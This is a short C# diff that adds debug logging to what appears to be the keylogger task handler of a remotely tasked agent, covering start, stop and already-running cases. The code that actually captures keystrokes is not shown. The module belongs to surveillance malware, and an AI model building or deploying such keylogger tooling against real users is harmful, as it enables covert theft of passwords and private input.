@@ -47,9 +47,11 @@ namespace Workflow
         }
         public async Task Execute(ServerJob job)
         {
+            DebugLog.Log($"Executing {Name} [{job.task.id}]");
             Dictionary<string, string> args = Misc.ConvertJsonStringToDict(job.task.parameters);
             if (args["action"].ToLower() == "stop")
             {
+                DebugLog.Log($"{Name} stop requested [{job.task.id}]");
                 if (this.isRunning)
                 {
                     cts.Cancel();
@@ -58,6 +60,7 @@ namespace Workflow
                 }
                 else
                 {
+                    DebugLog.Log($"{Name} not running, nothing to stop [{job.task.id}]");
                     messageManager.WriteLine("Task is not running.", job.task.id, true);
                 }
                 return;
@@ -65,14 +68,17 @@ namespace Workflow
 
             if(!this.isRunning)
             {
+                DebugLog.Log($"{Name} starting keylogger [{job.task.id}]");
                 cts = new CancellationTokenSource();
                 StartKeylogger(job.task.id);
                 messageManager.WriteLine("Keylogger started.", job.task.id, true);
             }
             else
             {
+                DebugLog.Log($"{Name} already running [{job.task.id}]");
                 messageManager.WriteLine("Already running", job.task.id, true);
             }
+            DebugLog.Log($"{Name} completed [{job.task.id}]");
         }
         public bool StartKeylogger(string task_id)
         {
